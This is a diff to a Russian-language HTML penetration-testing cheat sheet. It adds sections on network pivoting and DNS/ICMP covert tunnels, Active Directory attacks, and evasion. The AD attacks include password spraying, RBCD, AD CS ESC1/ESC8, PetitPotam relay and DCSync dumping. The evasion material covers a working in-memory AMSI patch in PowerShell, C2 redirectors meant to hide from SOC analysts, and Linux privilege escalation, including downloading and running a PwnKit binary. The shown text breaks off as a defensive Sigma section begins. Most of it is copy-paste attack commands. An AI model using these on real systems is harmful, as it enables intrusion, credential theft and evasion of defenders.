@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="ru" data-theme="dark">
 
 <head>
@@ -33,10 +33,24 @@
     </div>
     <button id="filterChip" class="filter-chip" title="Сбросить фильтр по тегу"></button>
     <span id="searchStatus" class="search-status"></span>
-    <button id="mobileSearchBtn" class="icon-btn mobile-search-btn" type="button" title="Поиск по памятке" aria-label="Открыть поиск" aria-expanded="false" aria-controls="searchWrap">
+    <div class="header-end">
+      <button id="mobileSearchBtn" class="icon-btn mobile-search-btn" type="button" title="Поиск по памятке" aria-label="Открыть поиск" aria-expanded="false" aria-controls="searchWrap">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
     </button>
-    <button id="themeBtn" class="icon-btn" title="Переключить тему" aria-label="Тема">
+      <div class="mode-switch-wrap">
+      <button id="modeToggle" class="mode-switch-btn" type="button" title="Переключить режим: Компактный (Pro) / С пояснениями (Новичок)" aria-label="Режим отображения" aria-pressed="true">
+        <span class="mode-pill" aria-hidden="true"></span>
+        <span class="mode-opt mode-opt-pro">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+          <span class="mode-text">Pro</span>
+        </span>
+        <span class="mode-opt mode-opt-full">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>
+          <span class="mode-text">Новичок</span>
+        </span>
+      </button>
+    </div>
+      <button id="themeBtn" class="icon-btn" title="Переключить тему" aria-label="Тема">
       <svg id="iconMoon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
         <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z" />
       </svg>
@@ -45,12 +59,14 @@
         <path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" />
       </svg>
     </button>
-    <button id="burgerBtn" class="icon-btn" title="Меню" aria-label="Открыть меню">
+      <button id="burgerBtn" class="icon-btn" title="Меню" aria-label="Открыть меню">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
         <path d="M3 6h18M3 12h18M3 18h18" />
       </svg>
     </button>
+    </div>
   </header>
+
 
   <div class="overlay" id="navOverlay"></div>
   <div class="layout">
@@ -62,11 +78,15 @@
       <a class="nav-link" href="#recon"><span class="nav-num">04</span>Разведка (Recon)</a>
       <a class="nav-link" href="#attack"><span class="nav-num">05</span>Атака</a>
       <a class="nav-link" href="#defense"><span class="nav-num">06</span>Защита и Hardening</a>
-      <a class="nav-link" href="#tools"><span class="nav-num">07</span>Полезные инструменты</a>
-      <a class="nav-link" href="#oneliners"><span class="nav-num">08</span>One-liners</a>
-      <a class="nav-link" href="#sandbox"><span class="nav-num">09</span>Песочница</a>
-      <a class="nav-link" href="#scenario"><span class="nav-num">10</span>Сквозной сценарий</a>
-      <a class="nav-link" href="#resources"><span class="nav-num">11</span>Литература и ресурсы</a>
+      <a class="nav-link" href="#pivoting-advanced"><span class="nav-num">07</span>L3/L2 Pivoting &amp; Tunneling</a>
+      <a class="nav-link" href="#ad-exploitation"><span class="nav-num">08</span>Active Directory Exploitation</a>
+      <a class="nav-link" href="#evasion-postex"><span class="nav-num">09</span>Evasion, Bypass &amp; Post-Ex</a>
+      <a class="nav-link" href="#dfir-hunting"><span class="nav-num">10</span>DFIR &amp; Threat Hunting</a>
+      <a class="nav-link" href="#tools"><span class="nav-num">11</span>Полезные инструменты</a>
+      <a class="nav-link" href="#oneliners"><span class="nav-num">12</span>One-liners</a>
+      <a class="nav-link" href="#sandbox"><span class="nav-num">13</span>Песочница</a>
+      <a class="nav-link" href="#scenario"><span class="nav-num">14</span>Сквозной сценарий</a>
+      <a class="nav-link" href="#resources"><span class="nav-num">15</span>Литература и ресурсы</a>
       <div class="nav-foot">Горячие клавиши: <kbd>/</kbd> или <kbd>Ctrl K</kbd> — поиск.</div>
     </nav>
 
@@ -88,12 +108,6 @@
               <span>Сброс</span>
             </button>
           </div>
-          <div class="view-toggles">
-            <button type="button" class="btn-tb" id="btnCompactMode" title="Режим «только команды» без длинных описаний" aria-pressed="false">
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
-              <span>Компактно</span>
-            </button>
-          </div>
         </div>
 
         <div class="cat-tabs" id="catTabs" role="tablist" aria-label="Быстрая фильтрация по категориям">
@@ -102,6 +116,8 @@
           <button type="button" class="cat-tab" data-cat="recon">🌐 Recon</button>
           <button type="button" class="cat-tab" data-cat="web">💉 Web / OWASP</button>
           <button type="button" class="cat-tab" data-cat="ad">🏰 Active Directory</button>
+          <button type="button" class="cat-tab" data-cat="pivoting">🔀 Pivoting</button>
+          <button type="button" class="cat-tab" data-cat="evasion">🥷 Evasion &amp; Bypass</button>
           <button type="button" class="cat-tab" data-cat="privesc">⚡ PrivEsc</button>
           <button type="button" class="cat-tab" data-cat="defense">🛡️ Blue Team</button>
           <button type="button" class="cat-tab" data-cat="oneliners">⚙️ One-liners</button>
@@ -1148,9 +1164,432 @@ yara -r -s webshell_detector.yar /var/www/html/</pre>
           того, как ужесточать правила.</div>
       </section>
 
+      <!--SEC-pivoting-advanced-->
+      <section class="block" id="pivoting-advanced">
+        <div class="sec-head"><span class="sec-num">07</span>
+          <h2 class="sec-title">Продвинутый Pivoting &amp; L3/L2 Tunneling</h2>
+        </div>
+        <p class="sec-sub">Выход из периметра во внутренние сегменты (L3 VPN, каскадный пивотинг и скрытные каналы через DNS/ICMP).</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>Пробитый веб-сервер в DMZ — только начало. Настоящие базы данных и контроллеры домена спрятаны в изолированных подсетях. Pivoting превращает жертву в сетевой мост.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>SOCKS-прокси — это почтальон, который носит только письма (TCP). Ligolo-ng — это полноценный кабель, протянутый прямо в изолированную комнату (работают любые протоколы и ping).</div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Привязка только к SOCKS4/5 через proxychains ломает полуоткрытые SYN-сканы nmap, не пропускает ICMP-пинги и не позволяет слушать обратные шеллы из внутренней сети.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Ligolo-ng поднимает настоящий TUN-адаптер в ОС атакующего.</li>
+              <li>Слушатели (listeners) позволяют пробивать 2-й и 3-й уровни изоляции (Double/Triple Pivot).</li>
+              <li>DNS/ICMP туннели спасают при тотальном запрете исходящего TCP/UDP.</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-ligolo" data-tags="pivoting network redteam tunnel">
+          <div class="cmd-head">
+            <h3>Ligolo-ng — современный L3-туннелинг через TUN-интерфейс</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. На хосте атакующего (Kali/Linux): создание TUN-интерфейса и запуск прокси-сервера:
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# 2. На скомпрометированном хосте (Pivot Agent):
+./agent -connect <span class="ph-lhost">10.10.14.2</span>:11601 -ignore-cert
+
+# 3. В интерактивной консоли Ligolo на атакующем:
+session
+# Выбираем номер сессии (напр. 1) и активируем туннель:
+start
+# Добавляем маршрут во внутреннюю сеть жертвы напрямую через интерфейс ligolo:
+sudo ip route add 172.16.20.0/24 dev ligolo
+
+# 4. Сканирование и атака внутренней сети БЕЗ proxychains (напрямую!):
+nmap -sS -Pn -p 22,80,445 172.16.20.10
+curl http://172.16.20.10/admin</pre>
+          <p class="cmd-note"><b>Ligolo-ng</b> работает на сетевом уровне L3 с помощью TUN-устройства. В отличие от медленных SOCKS-прокси, здесь не требуется <code>proxychains</code> — вы можете выполнять настоящие быстрые SYN-сканы (<code>nmap -sS</code>), использовать утилиты с сырыми сокетами и ловить reverse shells из внутренней сети.</p>
+          <div class="tags"><span class="tag-link" data-tag="pivoting">#pivoting</span><span class="tag-link" data-tag="network">#network</span><span class="tag-link" data-tag="tunnel">#tunnel</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-multi-pivoting" data-tags="pivoting network redteam">
+          <div class="cmd-head">
+            <h3>Double &amp; Triple Pivoting — каскадный туннелинг через цепочку хостов</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Сценарий: Attacker (<span class="ph-lhost">10.10.14.2</span>) ➔ Pivot-1 (172.16.20.5) ➔ Pivot-2 (192.168.100.15) ➔ Deep LAN
+
+# 1. Настройка первого прыжка (Pivot-1 подключен к серверу Ligolo):
+# В сессии 1 на атакующем поднимаем слушатель для приема подключений из изолированного сегмента:
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+
+# 2. На Pivot-2 запускаем агент, направляя его на адрес Pivot-1 в доступной ему подсети:
+./agent -connect 172.16.20.5:11601 -ignore-cert
+
+# 3. На атакующем переключаемся на сессию 2 и маршрутизируем самую глубокую подсеть:
+session   # выбираем [2]
+start
+sudo ip route add 192.168.100.0/24 dev ligolo
+
+# Альтернатива через каскадный SSH (ProxyJump / -J):
+ssh -J user1@<span class="ph-rhost">10.10.10.1</span>,user2@172.16.20.5 user3@192.168.100.15 -D 1085 -N</pre>
+          <p class="cmd-note"><b>Double/Triple Pivoting</b> позволяет преодолевать глубоко эшелонированные сегменты (DMZ ➔ Corporate Network ➔ SCADA/Bank Processing). Слушатель <code>listener_add</code> транслирует сокет Ligolo дальше по цепочке, связывая множественные сессии в один стек маршрутизации.</p>
+          <div class="tags"><span class="tag-link" data-tag="pivoting">#pivoting</span><span class="tag-link" data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-covert-tunnels" data-tags="pivoting tunnel evasion network">
+          <div class="cmd-head">
+            <h3>DNS &amp; ICMP Covert Tunneling — dnscat2, iodine, pingtunnel</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. DNS Tunneling через dnscat2 (обход фаерволов, пропускающих только резолв DNS на 53 UDP):
+# Сервер (на машине атакующего с делегированным доменом или локально):
+ruby dnscat2.rb --dns domain=tunnel.evil.com,port=53
+# Клиент на целевой изолированной машине:
+./dnscat --dns server=<span class="ph-lhost">10.10.14.2</span>,port=53,domain=tunnel.evil.com
+
+# 2. Полноценный IP over DNS через iodine (создает tun0-интерфейс):
+sudo iodined -f -c -P secretPass123 10.99.99.1 tunnel.evil.com     # Сервер
+sudo iodine -f -P secretPass123 <span class="ph-lhost">10.10.14.2</span> tunnel.evil.com        # Клиент
+
+# 3. ICMP Tunneling через pingtunnel (инкапсуляция TCP-трафика в ICMP Echo Request/Reply):
+# Сервер:
+sudo ptunnel -x MyPassKey
+# Клиент (проброс удаленного порта SSH 22 через echo-пакеты на локальный порт 8022):
+ptunnel -p <span class="ph-lhost">10.10.14.2</span> -lp 8022 -da 127.0.0.1 -dp 22 -x MyPassKey
+ssh -p 8022 user@127.0.0.1</pre>
+          <p class="cmd-note">Скрытые туннели применяются в условиях жесточайшей фильтрации периметра (Egress Filtering), где закрыты все порты кроме системного DNS или ICMP. Трафик шифруется и упаковывается в поля полезной нагрузки легитимных протоколов.</p>
+          <div class="tags"><span class="tag-link" data-tag="pivoting">#pivoting</span><span class="tag-link" data-tag="tunnel">#tunnel</span><span class="tag-link" data-tag="evasion">#evasion</span></div>
+        </article>
+      </section>
+
+      <!--SEC-ad-exploitation-->
+      <section class="block" id="ad-exploitation">
+        <div class="sec-head"><span class="sec-num">08</span>
+          <h2 class="sec-title">Active Directory Exploitation</h2>
+        </div>
+        <p class="sec-sub">Атаки на корпоративную инфраструктуру Windows: Kerberos, делегирование, сертификаты AD CS и Coerced Auth.</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>90% корпораций управляются Active Directory. Получение локального админа на рабочей станции бесполезно, если цель — база данных, почта или домен-контроллер.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>Домен — это феодальный замок: BloodHound чертит карту тайных ходов, Kerberos раздает именные пропуска с печатями, а AD CS — это мастерская поддельных королевских грамот.</div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Без понимания современных векторов (RBCD, AD CS ESC1–ESC8, Shadow Credentials) пентестер застрянет на этапе рядового пользователя без прав.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>NetExec (nxc) быстро находит уязвимые конфигурации и валидирует креды.</li>
+              <li>RBCD и Shadow Credentials дают контроль над хостами через ACL.</li>
+              <li>Ошибки шаблонов AD CS мгновенно дают сертификат Domain Admin.</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-ad-netexec" data-tags="ad attack recon windows">
+          <div class="cmd-head">
+            <h3>Initial Access &amp; Recon: NetExec (nxc) &amp; BloodHound Cypher</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Быстрая разведка подсети и поиск SMB Signing:
+nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
+
+# 2. Password Spraying (1 попытка пароля по всем пользователям во избежание lockout):
+nxc smb <span class="ph-rhost">10.10.10.1</span> -u users.txt -p 'Welcome2026!' --continue-on-success
+
+# 3. Проверка прав администратора и исполнение команд (помечает хост ярлыком Pwn3d!):
+nxc smb <span class="ph-rhost">10.10.10.1</span> -u 'admin_user' -p 'Pass123!' -X 'whoami /all'
+
+# 4. Мощные аналитические Cypher-запросы для BloodHound / Neo4j:
+# Поиск кратчайшего пути от подконтрольных учеток до группы Domain Admins:
+MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p;
+
+# Поиск пользователей с правом WriteDacl или GenericAll на объекты компьютеров:
+MATCH (u:User)-[r:GenericAll|WriteDacl]->(c:Computer) RETURN u,r,c;</pre>
+          <p class="cmd-note"><b>NetExec</b> — золотой стандарт быстрой разведки протоколов SMB, WMI, WinRM, LDAP и MSSQL. BloodHound визуализирует миллионы связей и доверительных отношений в домене, показывая кратчайшие векторы атаки.</p>
+          <div class="tags"><span class="tag-link" data-tag="ad">#ad</span><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link" data-tag="windows">#windows</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ad-delegation" data-tags="ad kerberos attack privesc">
+          <div class="cmd-head">
+            <h3>Kerberos &amp; Delegation: Unconstrained, Constrained, RBCD &amp; Shadow Credentials</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Resource-Based Constrained Delegation (RBCD) — эскалация до SYSTEM на целевом ПК:
+# Создаем фейковый машинный аккаунт в домене (MachineAccountQuota >= 1):
+impacket-addcomputer domain.local/user:'Pass' -computer-name 'EVILPC$' -computer-pass 'CompPass!1'
+
+# Записываем RBCD в атрибут msDS-AllowedToActOnBehalfOfOtherIdentity целевого сервера:
+impacket-rbcd domain.local/user:'Pass' -action write -delegate-from 'EVILPC$' -delegate-to 'TARGET-SRV$'
+
+# Запрашиваем тикет impersonation от имени Domain Administrator (S4U2Self + S4U2Proxy):
+impacket-getST -spn cifs/TARGET-SRV.domain.local -impersonate Administrator 'domain.local/EVILPC$:CompPass!1'
+export KRB5CCNAME=Administrator.ccache
+impacket-wmiexec -k -no-pass TARGET-SRV.domain.local
+
+# 2. Shadow Credentials (эксплуатация атрибута msDS-KeyCredentialLink через GenericWrite):
+certipy shadow auto -u 'user@domain.local' -p 'Pass' -account 'target_user' -dc-ip <span class="ph-rhost">10.10.10.1</span></pre>
+          <p class="cmd-note"><b>RBCD</b> позволяет владельцу или пользователю с правами записи на учетную запись компьютера настроить делегирование полномочий и получить билет администратора на целевой хост без участия контроллера домена. <b>Shadow Credentials</b> подставляет публичный ключ X.509 прямо в LDAP-атрибут жертвы для получения PKINIT TGT.</p>
+          <div class="tags"><span class="tag-link" data-tag="ad">#ad</span><span class="tag-link" data-tag="kerberos">#kerberos</span><span class="tag-link" data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ad-adcs" data-tags="ad attack privesc certs">
+          <div class="cmd-head">
+            <h3>Active Directory Certificate Services (AD CS): шаблоны ESC1–ESC8 (certipy)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Поиск всех уязвимых шаблонов сертификатов в домене:
+certipy find -u 'user@domain.local' -p 'Pass' -dc-ip <span class="ph-rhost">10.10.10.1</span> -vulnerable
+
+# 2. Эксплуатация ESC1 (Client Authentication + Enrollee Supplies Subject / SAN):
+# Запрашиваем сертификат с подменой SAN на учетку Domain Administrator:
+certipy req -u 'user@domain.local' -p 'Pass' -ca 'CORP-CA' -template 'UserTemplate' -upn 'administrator@domain.local'
+
+# Аутентификация по выпущенному PFX-сертификату через PKINIT и получение NTLM-хэша:
+certipy auth -pfx administrator.pfx -dc-ip <span class="ph-rhost">10.10.10.1</span>
+# Получаем NT-хэш: aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+
+# 3. Эксплуатация ESC8 (NTLM Relay на уязвимый HTTP-эндпоинт веб-регистрации AD CS):
+impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</pre>
+          <p class="cmd-note">Служба сертификации AD CS при некорректно настроенных шаблонах (ESC1–ESC8) позволяет любому непривилегированному пользователю выпустить легитимный сертификат от имени администратора домена, гарантируя мгновенную полную компрометацию леса AD.</p>
+          <div class="tags"><span class="tag-link" data-tag="ad">#ad</span><span class="tag-link" data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ad-coerced" data-tags="ad lateral-movement attack ntlm">
+          <div class="cmd-head">
+            <h3>NTLM Relay &amp; Coerced Authentication: PetitPotam &amp; ntlmrelayx</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Запуск ntlmrelayx с трансляцией аутентификации на контроллер домена (LDAP без подписи):
+impacket-ntlmrelayx -t ldap://<span class="ph-rhost">10.10.10.1</span> --delegate-access --escalate-user 'low_user'
+
+# 2. Принудительный вызов аутентификации контроллера домена через PetitPotam (MS-EFSRPC):
+python3 PetitPotam.py <span class="ph-lhost">10.10.14.2</span> <span class="ph-rhost">10.10.10.1</span>
+
+# 3. Альтернатива: Coerce через PrinterBug (MS-RPRN):
+python3 dementor.py -u 'user' -p 'Pass' -d 'domain.local' <span class="ph-lhost">10.10.14.2</span> <span class="ph-rhost">10.10.10.1</span>
+
+# 4. Дамп всей базы Active Directory (NTDS.dit) через полученные права DCSync:
+impacket-secretsdump domain.local/'low_user':'NewPass'@<span class="ph-rhost">10.10.10.1</span> -just-dc</pre>
+          <p class="cmd-note">Атаки класса <b>Coerced Authentication</b> используют штатные RPC-интерфейсы Windows (MS-EFSRPC, Spooler), принуждая сервер выполнить аутентификацию по протоколу SMB на машине атакующего. Ретрансляция этой сессии на LDAP/ADCS обеспечивает захват домена без брутфорса паролей.</p>
+          <div class="tags"><span class="tag-link" data-tag="ad">#ad</span><span class="tag-link" data-tag="lateral-movement">#lateral-movement</span></div>
+        </article>
+      </section>
+
+      <!--SEC-evasion-postex-->
+      <section class="block" id="evasion-postex">
+        <div class="sec-head"><span class="sec-num">09</span>
+          <h2 class="sec-title">Evasion, Bypass &amp; Post-Exploitation</h2>
+        </div>
+        <p class="sec-sub">Обход защитных рубежей: фаерволы приложений (WAF), антивирусы и EDR, скрытная инфраструктура C2 и привилегии ядра.</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>В реальных системах стоят WAF, антивирус Defender и агент EDR. Стандартные пейлоады из интернета заблокируются на 100%. Evasion — это искусство проходить сквозь радары незамеченным.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>AMSI/EDR — это рентген на вокзале. Загружать чистый бинарник Mimikatz — всё равно что нести оружие в открытую. Патчинг памяти и редиректоры C2 — это маскировка и проход через служебный коридор.</div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Первый же запуск PowerShell-команды затриггерит алерт в SOC, IP атакующего отправится в бан, а сессия будет принудительно разорвана агентом EDR.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Request Smuggling обходит WAF за счет рассинхронизации парсинга HTTP.</li>
+              <li>Патчинг AmsiScanBuffer в памяти процесса отключает проверку скриптов.</li>
+              <li>Редиректоры C2 прячут управляющие сервера за легитимными CDN.</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-waf-smuggling" data-tags="evasion web attack owasp">
+          <div class="cmd-head">
+            <h3>WAF Evasion: HTTP Request Smuggling (CL.TE / TE.CL) &amp; Parameter Pollution (HPP)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. HTTP Request Smuggling (CL.TE рассинхронизация заголовков):
+# Фронтенд использует Content-Length, а бэкенд обрабатывает Transfer-Encoding:
+POST / HTTP/1.1
+Host: vulnerable-app.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED_REQUEST_PREFIX
+
+# 2. HTTP Parameter Pollution (HPP) — обход правил WAF:
+# WAF проверяет первое значение, бэкенд читает последнее (PHP/Node):
+GET /api/user?id=12&amp;id=12+UNION+SELECT+null,password+FROM+users--
+
+# Склейка через запятую в ASP.NET (id=1,2):
+GET /search?param=SELECT/*&amp;param=*/password/*&amp;param=*/FROM/*&amp;param=*/users</pre>
+          <p class="cmd-note"><b>HTTP Request Smuggling</b> эксплуатирует различия в реализации стандарта HTTP/1.1 между фронтенд-балансировщиком и бэкенд-сервером, позволяя подмешивать невидимые префиксы в чужие HTTP-запросы и обходить WAF. <b>HPP</b> манипулирует одинаковыми именами параметров для запутывания сигнатур сетевого экрана.</p>
+          <div class="tags"><span class="tag-link" data-tag="evasion">#evasion</span><span class="tag-link" data-tag="web">#web</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-amsi-edr-bypass" data-tags="evasion attack windows postex">
+          <div class="cmd-head">
+            <h3>AMSI &amp; EDR Bypass: патчинг ntdll.dll и AMSI в PowerShell</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Патчинг AmsiScanBuffer в памяти текущего процесса PowerShell (отключение AMSI):
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)   # mov eax, 0x80070057; ret
+$Win32 = @"
+using System; using System.Runtime.InteropServices;
+public class AMSI {
+  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
+  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
+  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
+}
+"@
+Add-Type $Win32
+$h = [AMSI]::LoadLibrary("amsi.dll")
+$a = [AMSI]::GetProcAddress($h, "AmsiScanBuffer")
+$o = 0; [AMSI]::VirtualProtect($a, [UIntPtr]6, 0x40, [ref]$o)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $a, 6)
+# Проверка: теперь "Invoke-Mimikatz" и любые вредоносные строки не блокируются!
+
+# 2. Обход хуков EDR (DLL Unhooking ntdll.dll):
+# Считывание оригинальной секции .text из чистой копии \SystemRoot\System32\ntdll.dll на диске
+# и перезапись захуканной таблицы сисколлов в памяти процесса.</pre>
+          <p class="cmd-note">AMSI (Antimalware Scan Interface) проверяет скриптовые команды перед их запуском. Патчинг опкодов возврата в библиотеке <code>amsi.dll</code> в адресном пространстве процесса заставляет антивирус всегда считать любой код чистым (<code>S_OK</code>).</p>
+          <div class="tags"><span class="tag-link" data-tag="evasion">#evasion</span><span class="tag-link" data-tag="windows">#windows</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-c2-redirectors" data-tags="evasion redteam c2 tools">
+          <div class="cmd-head">
+            <h3>C2 Infrastructure: скрытные редиректоры и маскировка трафика</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Apache mod_rewrite редиректор (/etc/apache2/sites-available/c2.conf):
+# Пропускаем только агентский трафик с правильным User-Agent и URI-паттерном:
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5\.0\ \(Windows\ NT\ 10\.0;\ Win64;\ x64\)\ Edge/120\.0$
+RewriteCond %{REQUEST_URI} ^/news/articles/sync\.php$
+RewriteRule ^.*$ http://internal-c2-teamserver:8080%{REQUEST_URI} [P]
+
+# Всех остальных исследователей, сканеры SOC и краулеры сбрасываем на официальный сайт:
+RewriteRule ^.*$ https://www.microsoft.com [R=302,L]
+
+# 2. Serverless Cloudflare Worker в качестве фронтенд-редиректора:
+export default {
+  async fetch(request) {
+    const url = new URL(request.url);
+    if (request.headers.get("X-Auth-Token") === "secret-c2-token") {
+      url.hostname = "real-c2.backend.infra";
+      return fetch(new Request(url, request));
+    }
+    return Response.redirect("https://cloudflare.com", 302);
+  }
+};</pre>
+          <p class="cmd-note">Редиректоры отделяют уязвимый Team Server от интернета. При анализе защитники видят только IP-адреса Cloudflare или проксирующего хоста, а сигнатурный фильтр по User-Agent и кастомным заголовкам отсекает 99% автоматизированных защитных песочниц.</p>
+          <div class="tags"><span class="tag-link" data-tag="evasion">#evasion</span><span class="tag-link" data-tag="redteam">#redteam</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-linux-polkit" data-tags="evasion privesc linux redteam">
+          <div class="cmd-head">
+            <h3>Linux PrivEsc: Capabilities &amp; D-Bus / Polkit (CVE-2021-4034 PwnKit)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Разведка и эксплуатация нестандартных прав Linux Capabilities:
+getcap -r / 2&gt;/dev/null
+# Если найден /usr/bin/python3 = cap_setuid+ep:
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Если найден /usr/bin/tar = cap_dac_read_search+ep (чтение любых файлов без прав):
+tar -cvf shadow.tar /etc/shadow &amp;&amp; tar -xvf shadow.tar -O
+
+# 2. Эксплуатация Polkit Local Privilege Escalation (CVE-2021-4034 PwnKit):
+# Проверяем наличие SUID-бита на pkexec:
+ls -la /usr/bin/pkexec
+# Быстрая эксплуатация с компиляцией в оперативной памяти:
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/pwnkit
+chmod +x /tmp/pwnkit &amp;&amp; /tmp/pwnkit
+# Результат: # id (uid=0(root) gid=0(root))</pre>
+          <p class="cmd-note"><b>Linux Capabilities</b> разделяют привилегии root на изолированные биты. Утилиты с <code>cap_setuid</code> или <code>cap_dac_read_search</code> позволяют получить шелл суперпользователя. <b>PwnKit (CVE-2021-4034)</b> эксплуатирует логическую ошибку в системной службе Polkit и гарантированно работает на подавляющем большинстве ядер Linux без ограничений.</p>
+          <div class="tags"><span class="tag-link" data-tag="evasion">#evasion</span><span class="tag-link" data-tag="privesc">#privesc</span><span class="tag-link" data-tag="linux">#linux</span></div>
+        </article>
+      </section>
+
+      <!--SEC-dfir-hunting-->
+      <section class="block" id="dfir-hunting">
+        <div class="sec-head"><span class="sec-num">10</span>
+          <h2 class="sec-title">Blue Team / DFIR &amp; Threat Hunting</h2>
+        </div>
+        <p class="sec-sub">Анализ цифровых доказательств, охота за угрозами (Threat Hunting), правила Sigma и криминалистика памяти (Volatility 3).</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>Взлом уже произошел. Задача расследования (DFIR) — быстро ответить: как злоумышленник вошел, где он закрепился, какие данные скопировал и остался ли он в системе.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>Судмедэксперт на месте преступления: журналы EVTX — это отпечатки пальцев и камеры наблюдения, дамп памяти RAM — фото момента преступления, а правила Sigma — ориентировка для поиска похожих инцидентов.</div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Переустановка скомпрометированного сервера без анализа памяти и EVTX оставит бэкдоры активными на других серверах в домене.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Правила Sigma дают единый стандарт детекта для любых SIEM (Splunk, Elastic, QRadar).</li>
+              <li>Volatility 3 восстанавливает скрытые процессы и инжекции в RAM.</li>
+              <li>Парсинг EVTX через Hayabusa сокращает часы анализа логов до секунд.</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-sigma-rules" data-tags="defense soc forensics rules">
+          <div class="cmd-head">
+            <h3>YARA &amp; Sigma Rules — универсальные правила обнаружения угроз</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Sigma-правило для обнаружения дампа памяти LSASS через rundll32/comsvcs:
+title: Подозрительный дамп памяти LSASS через comsvcs.dll
+id: 5691d1e6-3f4b-402a-a9e9-123456789abc
+status: production
+logsource:
